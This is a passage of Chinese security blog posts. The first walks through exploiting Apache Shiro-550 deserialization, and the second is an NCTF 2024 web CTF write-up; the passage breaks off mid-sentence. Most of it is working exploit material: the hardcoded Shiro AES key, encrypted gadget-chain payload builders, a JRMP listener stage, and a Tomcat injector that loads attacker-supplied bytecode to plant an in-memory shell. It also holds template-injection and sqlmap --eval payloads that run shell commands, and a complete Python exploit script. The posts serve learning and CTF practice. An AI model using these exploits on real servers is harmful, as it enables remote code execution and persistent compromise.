[{"content":"本篇文章仅用于技术交流学习和研究的目的，严禁使用文章中的技术用于非法目的和破坏。\n基础知识 组件 Shiro有三大核心组件，即Subject、SecurityManager 和 Realm\nSubject: 认证主体。Subject代表了当前的用户。包含Principals和Credentials两个信息。 SecurityManager：安全管理员。是Shiro架构的核心。与Subject的所有交互都会委托给SecurityManager，它负责与Shiro 的其他组件进行交互。 Realm：域。Shiro从Realm中获取安全数据（如用户、角色、权限），就是说SecurityManager要验证用户身份，那么它需要从Realm中获取相应的用户进行比较，来确定用户的身份是否合法 一些概念：\nAuthentication: 身份认证、登录，验证用户是不是拥有相应的身份; Authorization：鉴权，验证某个已认证的用户是否拥有某个权限 Session Manager: 会话管理 Cryptography: 加密,保护数据的安全性 Concurrency: Shiro支持多线程应用的并发验证，即，如在一个线程中开启另一个线程,能把权限自动的传播过去 Remember Me：会话保存 配置 web.xml，shiro通过filter进行注入。\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;web-app xmlns=\u0026#34;http://java.sun.com/xml/ns/javaee\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xsi:schemaLocation=\u0026#34;http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd\u0026#34; version=\u0026#34;2.5\u0026#34;\u0026gt; \u0026lt;listener\u0026gt; \u0026lt;listener-class\u0026gt;org.apache.shiro.web.env.EnvironmentLoaderListener\u0026lt;/listener-class\u0026gt; \u0026lt;/listener\u0026gt; \u0026lt;filter\u0026gt; \u0026lt;filter-name\u0026gt;ShiroFilter\u0026lt;/filter-name\u0026gt; \u0026lt;filter-class\u0026gt;org.apache.shiro.web.servlet.ShiroFilter\u0026lt;/filter-class\u0026gt; \u0026lt;/filter\u0026gt; \u0026lt;filter-mapping\u0026gt; \u0026lt;filter-name\u0026gt;ShiroFilter\u0026lt;/filter-name\u0026gt; \u0026lt;url-pattern\u0026gt;/*\u0026lt;/url-pattern\u0026gt; \u0026lt;/filter-mapping\u0026gt; \u0026lt;welcome-file-list\u0026gt; \u0026lt;welcome-file\u0026gt;index.jsp\u0026lt;/welcome-file\u0026gt; \u0026lt;/welcome-file-list\u0026gt; \u0026lt;/web-app\u0026gt; shiro.ini用于配置具体权限\n[main] shiro.loginUrl = /login.jsp [users] # format: username = password, role1, role2, ..., roleN root = secret,admin guest = guest,guest presidentskroob = 12345,president darkhelmet = ludicrousspeed,darklord,schwartz lonestarr = vespa,goodguy,schwartz [roles] # format: roleName = permission1, permission2, ..., permissionN admin = * schwartz = lightsaber:* goodguy = winnebago:drive:eagle5 [urls] /login.jsp = authc /logout = logout /account/** = authc /remoting/** = authc, roles[b2bClient], perms[\u0026#34;remote:invoke:lan,wan\u0026#34;] 漏洞分析 影响版本为 shiro 1.x \u0026lt; 1.2.5\n接口 org.apache.shiro.mgt.RememberMeManager定义了getRememberedPrincipals方法用于在指定上下文中找到记住的 principals，也就是 RememberMe 的功能。\npublic interface RememberMeManager { PrincipalCollection getRememberedPrincipals(SubjectContext var1); void forgetIdentity(SubjectContext var1); void onSuccessfulLogin(Subject var1, AuthenticationToken var2, AuthenticationInfo var3); void onFailedLogin(Subject var1, AuthenticationToken var2, AuthenticationException var3); void onLogout(Subject var1); } AbstractRememberMeManager是RememberMeManager的一个抽象实现类\n其实现的getRememberedPrincipals方法代码如下：\npublic PrincipalCollection getRememberedPrincipals(SubjectContext subjectContext) { PrincipalCollection principals = null; try { byte[] bytes = this.getRememberedSerializedIdentity(subjectContext); if (bytes != null \u0026amp;\u0026amp; bytes.length \u0026gt; 0) { principals = this.convertBytesToPrincipals(bytes, subjectContext); } } catch (RuntimeException var4) { principals = this.onRememberedPrincipalFailure(var4, subjectContext); } return principals; } 会调用getRememberedSerializedIdentity获取序列化的principals，CookieRememberMeManager类实现了这个方法，代码如下：\nprotected byte[] getRememberedSerializedIdentity(SubjectContext subjectContext) { ............. HttpServletRequest request = WebUtils.getHttpRequest(wsc); HttpServletResponse response = WebUtils.getHttpResponse(wsc); String base64 = this.getCookie().readValue(request, response); if (\u0026#34;deleteMe\u0026#34;.equals(base64)) { return null; } else if (base64 != null) { base64 = this.ensurePadding(base64); if (log.isTraceEnabled()) { log.trace(\u0026#34;Acquired Base64 encoded identity [\u0026#34; + base64 + \u0026#34;]\u0026#34;); } byte[] decoded = Base64.decode(base64); if (log.isTraceEnabled()) { log.trace(\u0026#34;Base64 decoded byte array length: \u0026#34; + (decoded != null ? decoded.length : 0) + \u0026#34; bytes.\u0026#34;); } return decoded; } else { return null; } } } } 获取Cookie中rememberMe字段的值并base64解码，传给AbstractRememberMeManager#convertBytesToPrincipals方法。代码如下：\nprotected PrincipalCollection convertBytesToPrincipals(byte[] bytes, SubjectContext subjectContext) { if (this.getCipherService() != null) { bytes = this.decrypt(bytes); } return this.deserialize(bytes); } 先进行解密再反序列化。\n加解密相关代码定义在AbstractRememberMeManager类中，使用AES-128-CBC算法。 KEY硬编码在AbstractRememberMeManager中。\nprivate static final byte[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode(\u0026#34;kPH+bIxk5D2deZiIxcaaaA==\u0026#34;); 触发DNSLOG：\npublic class Exp { public static void main(String[] args) throws Exception{ URLDNS urldns = new URLDNS(); Object expobj = urldns.getObject(\u0026#34;http://log.c37af96d-ec4e-43e4-8bd3-3c347d9eb7b8.dnshook.site\u0026#34;); System.out.println(ser(expobj)); } public static byte[] encrypt(byte[] data, byte[] key) { CipherService cipherService = new AesCipherService(); ByteSource byteSource = cipherService.encrypt(data, key); byte[] value = byteSource.getBytes(); return value; } public static String ser(Object obj) throws Exception { ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(obj); objectOutputStream.close(); byte[] encrypted = encrypt(byteArrayOutputStream.toByteArray(), Base64.decode(KEY)); return Base64.encodeToString(encrypted); } Key检测 当序列化payload使用错误的Key的时候，AbstractRememberMeManager#decrypt解密会报错，然后调用forgetIdentity方法，然后会调用removeFrom方法，会给返回包加上rememberMe=deleteMecookie。\n所以在爆破Key的时候当返回包没有rememberMe=deleteMe时就证明Key正确。\n反序列化利用链 CC链改造 但shiro反序列化时 ClassResolvingObjectInputStream 为 shiro 框架实现的自定义类\n在使用一些 Gadget 如 CC6 时会报错：Unable to load clazz named [[Lorg.apache.commons.collections.Transformer;]\n如果反序列化流中包含非 Java 自身的数组(非String[], byte[]等)，则会出现无法加载类的错误。\n让InvokerTransformer直接调用TemplatesImpl的newTransformer方法。代码如下：\npublic class Exp { public static void main(String[] args) throws Exception{ Templates templates = new TemplatesImpl(); setFieldValue(templates,\u0026#34;_bytecodes\u0026#34;,new byte[][]{getEvilClass()}); setFieldValue(templates,\u0026#34;_class\u0026#34;,null); setFieldValue(templates,\u0026#34;_name\u0026#34;,\u0026#34;asd\u0026#34;); InvokerTransformer invokerTransformer = new InvokerTransformer(\u0026#34;newTransformer\u0026#34;, null, null); HashMap\u0026lt;Object, Object\u0026gt; map = new HashMap\u0026lt;Object, Object\u0026gt;(); Map\u0026lt;Object, Object\u0026gt; lazymap = LazyMap.decorate(map, new ConstantTransformer(1)); HashMap\u0026lt;Object, Object\u0026gt; map2 = new HashMap\u0026lt;Object, Object\u0026gt;(); TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap, templates); map2.put(tiedMapEntry, \u0026#34;bbb\u0026#34;); map.remove(templates); setFieldValue(lazymap, \u0026#34;factory\u0026#34;, invokerTransformer); System.out.println(ser(map2)); } } commons-collections:4.0依赖的CC2可以直接用，但CC4不能用\nCB链改造 BeanComparator默认使用org.apache.commons.collections.comparators.ComparableComparator。在没有CC依赖时会报错。\nCB链是要调用BeanComparator#compare方法：\npublic int compare(Object o1, Object o2) { if (this.property == null) { return this.comparator.compare(o1, o2); } else { try { Object value1 = PropertyUtils.getProperty(o1, this.property); Object value2 = PropertyUtils.getProperty(o2, this.property); return this.comparator.compare(value1, value2); } catch (IllegalAccessException var5) { throw new RuntimeException(\u0026#34;IllegalAccessException: \u0026#34; + var5.toString()); } catch (InvocationTargetException var6) { throw new RuntimeException(\u0026#34;InvocationTargetException: \u0026#34; + var6.toString()); } catch (NoSuchMethodException var7) { throw new RuntimeException(\u0026#34;NoSuchMethodException: \u0026#34; + var7.toString()); } } } 然后调用PropertyUtils.getProperty触发getter。\n触发点在this.comparator.compare(value1, value2);前面，所以将ComparableComparator替换，甚至设为null也不会有影响。\nPOC：\npublic class Exp { public static void main(String[] argss) throws Exception{ Templates templates = new TemplatesImpl(); setFieldValue(templates,\u0026#34;_bytecodes\u0026#34;,new byte[][]{getEvilClass()}); setFieldValue(templates,\u0026#34;_class\u0026#34;,null); setFieldValue(templates,\u0026#34;_name\u0026#34;,\u0026#34;asd\u0026#34;); final BeanComparator comparator = new BeanComparator(\u0026#34;lowestSetBit\u0026#34;); final PriorityQueue\u0026lt;Object\u0026gt; queue = new PriorityQueue\u0026lt;Object\u0026gt;(2, comparator); queue.add(new BigInteger(\u0026#34;1\u0026#34;)); queue.add(new BigInteger(\u0026#34;1\u0026#34;)); setFieldValue(comparator, \u0026#34;comparator\u0026#34;, null); setFieldValue(comparator, \u0026#34;property\u0026#34;, \u0026#34;outputProperties\u0026#34;); final Object[] queueArray = (Object[]) getFieldValue(queue, \u0026#34;queue\u0026#34;); queueArray[0] = templates; queueArray[1] = templates; System.out.println(ser(queue)); } } RMI反序列化 二次反序列化思路，既然这里的反序列化禁止了非Java 自身的数组得反序列化，那通过RMI反序列化再次触发原生反序列化即可。\n用ysoserial.payloads.JRMPClient触发RMI连接，本地用ysoserial.exploits.JRMPListener监听连接然后发送CC1序列化数据。\nPOC：\npublic class Exp { public static void main(String[] args) throws Exception{ String host = \u0026#34;127.0.0.1\u0026#34;; int port = 1234; ObjID id = new ObjID(new Random().nextInt()); // RMI registry TCPEndpoint te = new TCPEndpoint(host, port); UnicastRef ref = new UnicastRef(new LiveRef(id, te, false)); RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref); Registry proxy = (Registry) Proxy.newProxyInstance(JRMPClient.class.getClassLoader(), new Class[] { Registry.class }, obj); System.out.println(ser(proxy)); CommonsCollections1 commonsCollections1 = new CommonsCollections1(); Object expobj = commonsCollections1.getObject(\u0026#34;calc\u0026#34;); JRMPListener jrmpListener = new JRMPListener(1234, expobj); jrmpListener.run(); } } 绕过Header长度限制 POST传参 Tomcat默认限制Header不能超过8192字节。\n在org.apache.coyote.http11.AbstractHttp11Protocol定义了： org.apache.coyote.http11.Http11InputBuffer#fill方法会检测是否超过限制。\nprivate boolean fill(boolean block) throws IOException { if (log.isTraceEnabled()) { log.trace(\u0026#34;Before fill(): parsingHeader: [\u0026#34; + this.parsingHeader + \u0026#34;], parsingRequestLine: [\u0026#34; + this.parsingRequestLine + \u0026#34;], parsingRequestLinePhase: [\u0026#34; + this.parsingRequestLinePhase + \u0026#34;], parsingRequestLineStart: [\u0026#34; + this.parsingRequestLineStart + \u0026#34;], byteBuffer.position(): [\u0026#34; + this.byteBuffer.position() + \u0026#34;], byteBuffer.limit(): [\u0026#34; + this.byteBuffer.limit() + \u0026#34;], end: [\u0026#34; + this.end + \u0026#34;]\u0026#34;); } if (this.parsingHeader) { if (this.byteBuffer.limit() \u0026gt;= this.headerBufferSize) { if (this.parsingRequestLine) { this.request.protocol().setString(\u0026#34;HTTP/1.1\u0026#34;); } throw new IllegalArgumentException(sm.getString(\u0026#34;iib.requestheadertoolarge.error\u0026#34;)); } } else { this.byteBuffer.limit(this.end).position(this.end); } 尝试反序列化部分和要加载的字节码分离，反序列化TemplatesImpl执行代码，从POST参数中获取base64编码的java字节码，然后调用defineClass加载。用javassist直接生成的java字节码比javac编译出来的体积小很多。POST传参的数据长度不限。\npublic class Exp { public static void main(String[] argss) throws Exception{ Templates templates = new TemplatesImpl(); setFieldValue(templates,\u0026#34;_bytecodes\u0026#34;,new byte[][]{generate()}); setFieldValue(templates,\u0026#34;_class\u0026#34;,null); setFieldValue(templates,\u0026#34;_name\u0026#34;,\u0026#34;asd\u0026#34;); AttrCompare attrCompare = new AttrCompare(); final BeanComparator comparator = new BeanComparator(\u0026#34;lowestSetBit\u0026#34;); final PriorityQueue\u0026lt;Object\u0026gt; queue = new PriorityQueue\u0026lt;Object\u0026gt;(2, comparator); queue.add(new BigInteger(\u0026#34;1\u0026#34;)); queue.add(new BigInteger(\u0026#34;1\u0026#34;)); setFieldValue(comparator, \u0026#34;comparator\u0026#34;, null); setFieldValue(comparator, \u0026#34;property\u0026#34;, \u0026#34;outputProperties\u0026#34;); final Object[] queueArray = (Object[]) getFieldValue(queue, \u0026#34;queue\u0026#34;); queueArray[0] = templates; queueArray[1] = templates; System.out.println(\u0026#34;序列化数据：\u0026#34;); System.out.println(ser(queue)); System.out.println(\u0026#34;\\n\\n字节码：\u0026#34;); System.out.println(Base64.encodeToString(getPayloadClass())); } public static byte[] generate() throws Exception{ try { ClassPool pool = ClassPool.getDefault(); CtClass ctClass = pool.makeClass(\u0026#34;Injector2\u0026#34;); CtClass superClass = pool.get(\u0026#34;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet\u0026#34;); ctClass.setSuperclass(superClass); CtConstructor constructor = ctClass.makeClassInitializer(); constructor.setBody(\u0026#34;......\u0026#34;); byte[] bytes = ctClass.toBytecode(); ctClass.defrost(); return bytes; } catch (Exception e) { e.printStackTrace(); return new byte[]{}; } } } 通过javassist生成类的构造函数代码，修改自Tomcat Echo：\n{ ThreadGroup group = Thread.currentThread().getThreadGroup(); java.lang.reflect.Field f = null; Thread[] threads = null; try{ f = group.getClass().getDeclaredField(\u0026#34;threads\u0026#34;); f.setAccessible(true); threads = (Thread[]) f.get(group); } catch(Exception e){} for(int i = 0; i \u0026lt; threads.length; i++) { try{ Thread t = threads[i]; if (t == null) continue; String str = t.getName(); if (str.contains(\u0026#34;exec\u0026#34;) || !str.contains(\u0026#34;http\u0026#34;)) continue; f = t.getClass().getDeclaredField(\u0026#34;target\u0026#34;); f.setAccessible(true); Object obj = f.get(t); if (!(obj instanceof Runnable)) continue; f = obj.getClass().getDeclaredField(\u0026#34;this$0\u0026#34;); f.setAccessible(true);obj = f.get(obj); try{ f = obj.getClass().getDeclaredField(\u0026#34;handler\u0026#34;); }catch (NoSuchFieldException e){ f = obj.getClass().getSuperclass().getSuperclass().getDeclaredField(\u0026#34;handler\u0026#34;); } f.setAccessible(true); obj = f.get(obj); try{ f = obj.getClass().getSuperclass().getDeclaredField(\u0026#34;global\u0026#34;); }catch(NoSuchFieldException e){ f = obj.getClass().getDeclaredField(\u0026#34;global\u0026#34;); } f.setAccessible(true); obj = f.get(obj); f = obj.getClass().getDeclaredField(\u0026#34;processors\u0026#34;); f.setAccessible(true); java.util.List processors = (java.util.List)(f.get(obj)); for(int j = 0; j \u0026lt; processors.size(); ++j) { Object processor = processors.get(j); f = processor.getClass().getDeclaredField(\u0026#34;req\u0026#34;); f.setAccessible(true); Object req = f.get(processor); Object note = req.getClass().getDeclaredMethod(\u0026#34;getNote\u0026#34;, new Class[]{int.class}).invoke(req, new Object[]{Integer.valueOf(1)}); String base64encoded = (String) note.getClass().getDeclaredMethod(\u0026#34;getParameter\u0026#34;, new Class[]{String.class}).invoke(note, new Object[]{\u0026#34;data\u0026#34;}); if (base64encoded == null) { continue; } byte[] code = org.apache.shiro.codec.Base64.decode(base64encoded); ClassLoader classLoader = Thread.currentThread().getContextClassLoader(); if (classLoader == null) { classLoader = ClassLoader.getSystemClassLoader(); } try { java.lang.reflect.Method defineClassMethod = ClassLoader.class.getDeclaredMethod(\u0026#34;defineClass\u0026#34;, new Class[]{byte[].class, int.class, int.class}); defineClassMethod.setAccessible(true); Class expClass = null; try{ expClass = Class.forName(\u0026#34;Payload\u0026#34;); // 方便多次加载 } catch (Exception e){ expClass = (Class) defineClassMethod.invoke(classLoader, new Object[]{code, Integer.valueOf(0), Integer.valueOf(code.length)}); } expClass.newInstance(); } catch (Exception e){ e.printStackTrace(); } } } catch (Exception e){ } } } 最终header中的payload长度为4736，可以绕过长度限制。\nPOST data参数传Payload类的base64编码后的字节码。\njavassist生成代码有一些神奇的报错，比如数字需要用Integer.valueOf包一下，还有就是POST传参的base64 payload需要url编码。\n将内存马注入器写到无参构造函数里，编译然后Base64编码，POST传参即可\n分段传输 可以将payload分成多段，先分段把payload保存在服务器上，然后再加载。\n输出到文件\n将字节码分段写入/tmp目录下，写完之后再最后读取加载，这种会有文件落地，不多说了。\n写入系统配置\n代码System.setProperty(\u0026quot;payload\u0026quot;,\u0026quot;\u0026quot;);可以写入java系统配置。\n分段写入后，读取加载即可：\nSystem.getProperty(\u0026#34;payload\u0026#34;); 参考 https://su18.org/post/shiro-5/\nhttps://juejin.cn/post/6991664333314850853\nhttps://y4tacker.github.io/2022/04/14/year/2022/4/%E6%B5%85%E8%B0%88Shiro550%E5%8F%97Tomcat-Header%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E5%BD%B1%E5%93%8D%E7%AA%81%E7%A0%B4/\nhttps://github.com/feihong-cs/Java-Rce-Echo/blob/master/Tomcat/code/TomcatEcho-%E5%85%A8%E7%89%88%E6%9C%AC.jsp\nhttp://www.bmth666.cn/2024/11/03/Shiro%E7%BB%95%E8%BF%87Header%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E8%BF%9B%E9%98%B6%E5%88%A9%E7%94%A8/\n","permalink":"https://zoiltin.github.io/posts/shiro-550%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","summary":"本篇文章仅用于技术交流学习和研究的目的，严禁使用文章中的技术用于非法目的和破坏。\n基础知识 组件 Shiro有三大核心组件，即Subject、SecurityManager 和 Realm\nSubject: 认证主体。Subject代表了当前的用户。包含Principals和Credentials两个信息。 SecurityManager：安全管理员。是Shiro架构的核心。与Subject的所有交互都会委托给SecurityManager，它负责与Shiro 的其他组件进行交互。 Realm：域。Shiro从Realm中获取安全数据（如用户、角色、权限），就是说SecurityManager要验证用户身份，那么它需要从Realm中获取相应的用户进行比较，来确定用户的身份是否合法 一些概念：\nAuthentication: 身份认证、登录，验证用户是不是拥有相应的身份; Authorization：鉴权，验证某个已认证的用户是否拥有某个权限 Session Manager: 会话管理 Cryptography: 加密,保护数据的安全性 Concurrency: Shiro支持多线程应用的并发验证，即，如在一个线程中开启另一个线程,能把权限自动的传播过去 Remember Me：会话保存 配置 web.xml，shiro通过filter进行注入。\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;web-app xmlns=\u0026#34;http://java.sun.com/xml/ns/javaee\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xsi:schemaLocation=\u0026#34;http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd\u0026#34; version=\u0026#34;2.5\u0026#34;\u0026gt; \u0026lt;listener\u0026gt; \u0026lt;listener-class\u0026gt;org.apache.shiro.web.env.EnvironmentLoaderListener\u0026lt;/listener-class\u0026gt; \u0026lt;/listener\u0026gt; \u0026lt;filter\u0026gt; \u0026lt;filter-name\u0026gt;ShiroFilter\u0026lt;/filter-name\u0026gt; \u0026lt;filter-class\u0026gt;org.apache.shiro.web.servlet.ShiroFilter\u0026lt;/filter-class\u0026gt; \u0026lt;/filter\u0026gt; \u0026lt;filter-mapping\u0026gt; \u0026lt;filter-name\u0026gt;ShiroFilter\u0026lt;/filter-name\u0026gt; \u0026lt;url-pattern\u0026gt;/*\u0026lt;/url-pattern\u0026gt; \u0026lt;/filter-mapping\u0026gt; \u0026lt;welcome-file-list\u0026gt; \u0026lt;welcome-file\u0026gt;index.jsp\u0026lt;/welcome-file\u0026gt; \u0026lt;/welcome-file-list\u0026gt; \u0026lt;/web-app\u0026gt; shiro.ini用于配置具体权限\n[main] shiro.loginUrl = /login.jsp [users] # format: username = password, role1, role2, ..., roleN root = secret,admin guest = guest,guest presidentskroob = 12345,president darkhelmet = ludicrousspeed,darklord,schwartz lonestarr = vespa,goodguy,schwartz [roles] # format: roleName = permission1, permission2, .","title":"Shiro-550漏洞复现"},{"content":"NCTF 2024 WEB AK ez_dash 过滤不全，可以通过\u0026lt;%%\u0026gt;执行python代码，但没有回显，用继承链获取bottle报错回显。\nhttps://www.osgeo.cn/bottle/stpl.html#embedded-python-code 使用getattr绕过.，bottle.abort(401, \u0026quot;message\u0026quot;)函数可以直接报错返回内容。\n\u0026lt;%eval(getattr(getattr(__import__(\u0026#39;base64\u0026#39;), \u0026#39;b64decode\u0026#39;)(\u0026#39;X19pbXBvcnRfXygnc3lzJykubW9kdWxlc1snX19tYWluX18nXS5ib3R0bGUuYWJvcnQoNDAxLCBfX2ltcG9ydF9fKCdvcycpLnBvcGVuKCdlbnYnKS5yZWFkKCkp\u0026#39;), \u0026#39;decode\u0026#39;)())%\u0026gt; sqlmap-master 参数注入，sqlmap -hh查看详细信息：\n--eval=EVALCODE Evaluate provided Python code before the request (e.g.\r\u0026#34;import hashlib;id2=hashlib.md5(id).hexdigest()\u0026#34;) sqlmap的eval可以执行python代码：\nsqlmap -u http://localhost --eval=\u0026#34;print(1)\u0026#34; 通过__import__报错回显，注意payload不能包含空格，不然会被分割。\npoc:\nhttp://localhost --eval=__import__(__import__(\u0026#39;os\u0026#39;).popen(__import__(\u0026#39;base64\u0026#39;).b64decode(\u0026#39;ZW52IHwgYmFzZTY0IHwgdHIgLWQgJ1xuJw==\u0026#39;).decode()).read()) ez_dash_revenge 远程环境pydash版本比较高，不允许覆盖__globals__和__builtin__，\n黑名单检测代码pydash/helpers.py： RESTRICTED_KEYS内容为：\nRESTRICTED_KEYS = (\u0026#34;__globals__\u0026#34;, \u0026#34;__builtins__\u0026#34;) 覆盖黑名单POC：\n/setValue?name=pydash\r{\u0026#34;path\u0026#34;:\u0026#34;helpers.RESTRICTED_KEYS\u0026#34;,\u0026#34;value\u0026#34;:[]} 然后再通过__globals__覆盖题目自定义的黑名单,POC:\n/setValue?name=setval\r{\u0026#34;path\u0026#34;:\u0026#34;__globals__.__forbidden_name__\u0026#34;,\u0026#34;value\u0026#34;:[]}\r{\u0026#34;path\u0026#34;:\u0026#34;__globals__.__forbidden_path__\u0026#34;,\u0026#34;value\u0026#34;:[]} bottle模板引擎使用正则匹配模板字符串，set_syntax代码如下：\ndef set_syntax(self, syntax): self._syntax = syntax self._tokens = syntax.split() if syntax not in self._re_cache: names = \u0026#39;block_start block_close line_start inline_start inline_end\u0026#39; etokens = map(re.escape, self._tokens) pattern_vars = dict(zip(names.split(), etokens)) patterns = (self._re_split, self._re_tok, self._re_inl) patterns = [re.compile(p % pattern_vars) for p in patterns] self._re_cache[syntax] = patterns self.re_split, self.re_tok, self.re_inl = self._re_cache[syntax] 默认的syntax为\u0026lt;% %\u0026gt; % {{ }}，其以空格分割分别对应block_start block_close line_start inline_start inline_end，然后被format进self.re_split, self.re_tok, self.re_inl这三个正则表达式里，render模板时用正则匹配内容，\u0026lt;%%\u0026gt;内部的和%后面的内容作为python代码执行，但没回显，{{}}内部的作为表达式求值，有回显。题目过滤了%\u0026lt;等字符，所以修改模板正则表达式就可以绕过了。\nbottle默认模板使用的是SimpleTemplate继承了BaseTemplate，在prepare方法给self.syntax赋值了。\nclass SimpleTemplate(BaseTemplate): def prepare(self, escape_func=html_escape, noescape=False, syntax=None, **ka): self.cache = {} enc = self.encoding self._str = lambda x: touni(x, enc) self._escape = lambda x: escape_func(touni(x, enc)) self.syntax = syntax if noescape: self._str, self._escape = self._escape, self._str BaseTemplate类的__init__函数代码如下：把self.settings传给prepare.\nself.name = name self.source = source.read() if hasattr(source, \u0026#39;read\u0026#39;) else source self.filename = source.filename if hasattr(source, \u0026#39;filename\u0026#39;) else None self.lookup = [os.path.abspath(x) for x in lookup] if lookup else [] self.encoding = encoding self.settings = self.settings.copy() # Copy from class variable self.settings.update(settings) # Apply if not self.source and self.name: self.filename = self.search(self.name, self.lookup) if not self.filename: raise TemplateError(\u0026#39;Template %s not found.\u0026#39; % repr(name)) if not self.source and not self.filename: raise TemplateError(\u0026#39;No template specified.\u0026#39;) self.prepare(**self.settings) 所以覆盖模板syntax POC如下：\n/setValue?name=bottle\r{\u0026#34;path\u0026#34;:\u0026#34;BaseTemplate.settings.syntax\u0026#34;,\u0026#34;value\u0026#34;:\u0026#34;` ` % | |\u0026#34;} 用||包裹即可执行代码并回显。\n具体的模板执行代码如下：\ndef execute(self, _stdout, kwargs): env = self.defaults.copy() env.update(kwargs) env.update({ \u0026#39;_stdout\u0026#39;: _stdout, \u0026#39;_printlist\u0026#39;: _stdout.extend, \u0026#39;include\u0026#39;: functools.partial(self._include, env), \u0026#39;rebase\u0026#39;: functools.partial(self._rebase, env), \u0026#39;_rebase\u0026#39;: None, \u0026#39;_str\u0026#39;: self._str, \u0026#39;_escape\u0026#39;: self._escape, \u0026#39;get\u0026#39;: env.get, \u0026#39;setdefault\u0026#39;: env.setdefault, \u0026#39;defined\u0026#39;: env.__contains__ }) exec(self.co, env) if env.get(\u0026#39;_rebase\u0026#39;): subtpl, rargs = env.pop(\u0026#39;_rebase\u0026#39;) rargs[\u0026#39;base\u0026#39;] = \u0026#39;\u0026#39;.join(_stdout) #copy stdout del _stdout[:] # clear stdout return self._include(env, subtpl, **rargs) return env 使用了exec函数，可以拿到__builtins__，所以可以将代码注入__builtins__中，因为setValue中对于value字段不限制长度，POC如下：\n/setValue?name=setval\r{\u0026#34;path\u0026#34;:\u0026#34;__builtins__.p\u0026#34;,\u0026#34;value\u0026#34;:\u0026#34;print(1)\u0026#34;} 注意以下代码：\ndef template(*args, **kwargs): .............. if tplid not in TEMPLATES or DEBUG: settings = kwargs.pop(\u0026#39;template_settings\u0026#39;, {}) if isinstance(tpl, adapter): TEMPLATES[tplid] = tpl if settings: TEMPLATES[tplid].prepare(**settings) elif \u0026#34;\\n\u0026#34; in tpl or \u0026#34;{\u0026#34; in tpl or \u0026#34;%\u0026#34; in tpl or \u0026#39;$\u0026#39; in tpl: TEMPLATES[tplid] = adapter(source=tpl, lookup=lookup, **settings) else: TEMPLATES[tplid] = adapter(name=tpl, lookup=lookup, **settings) if not TEMPLATES[tplid]: abort(500, \u0026#39;Template (%s) not found\u0026#39; % tpl) return TEMPLATES[tplid].render(kwargs) 模板内容需要包含\\n,{%$，不然不会进行render。\nPOC如下：\n/render?path=%0a|eval(p)| exp:\nimport requests url = \u0026#39;http://ip:port\u0026#39; def init(): # bypass pydash res = requests.post(url=url + \u0026#39;/setValue?name=pydash\u0026#39;, json={\u0026#34;path\u0026#34;:\u0026#34;helpers.RESTRICTED_KEYS\u0026#34;,\u0026#34;value\u0026#34;:[]}) if \u0026#39;yes\u0026#39; in res.text: print(\u0026#39;[+] bypass pydash success\u0026#39;) else: print(\u0026#39;[-] bypass pydash failed\u0026#39;) exit() # bypass path res = requests.post(url=url + \u0026#39;/setValue?name=setval\u0026#39;, json={\u0026#34;path\u0026#34;:\u0026#34;__globals__.__forbidden_path__\u0026#34;,\u0026#34;value\u0026#34;:[]}) if \u0026#39;yes\u0026#39; in res.text: print(\u0026#39;[+] bypass path success\u0026#39;) else: print(\u0026#39;[-] bypass path failed\u0026#39;) exit() # bypass name res = requests.post(url=url + \u0026#39;/setValue?name=setval\u0026#39;, json={\u0026#34;path\u0026#34;:\u0026#34;__globals__.__forbidden_name__\u0026#34;,\u0026#34;value\u0026#34;:[]}) if \u0026#39;yes\u0026#39; in res.text: print(\u0026#39;[+] bypass name success\u0026#39;) else: print(\u0026#39;[-] bypass name failed\u0026#39;) exit() # update syntax res = requests.post(url=url + \u0026#39;/setValue?name=bottle\u0026#39;, json={\u0026#34;path\u0026#34;:\u0026#34;BaseTemplate.settings.syntax\u0026#34;,\u0026#34;value\u0026#34;:\u0026#34;` ` % | |\u0026#34;}) if \u0026#39;yes\u0026#39; in res.text: print(\u0026#39;[+] bypass syntax success\u0026#39;) else: print(\u0026#39;[-] bypass syntax failed\u0026#39;) exit() def set_payload(payload): # set payload in builtin res = requests.post(url=url + \u0026#39;/setValue?name=setval\u0026#39;, json={\u0026#34;path\u0026#34;:\u0026#34;__builtins__.p\u0026#34;,\u0026#34;value\u0026#34;:payload}) if \u0026#39;yes\u0026#39; in res.text: print(\u0026#39;[+] set payload success\u0026#39;) else: print(\u0026#39;[-] set payload failed\u0026#39;) exit() def render(): # render res = requests.get(url=url + \u0026#39;/render?path=%0a|eval(p)|\u0026#39;) print(res.text) if __name__ == \u0026#39;__main__\u0026#39;: init() payload = \u0026#34;__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;env\u0026#39;).read()\u0026#34; set_payload(payload) render() H2 Revenge MyDataSource类可以触发jdbc连接，getter触发。\n用jackson 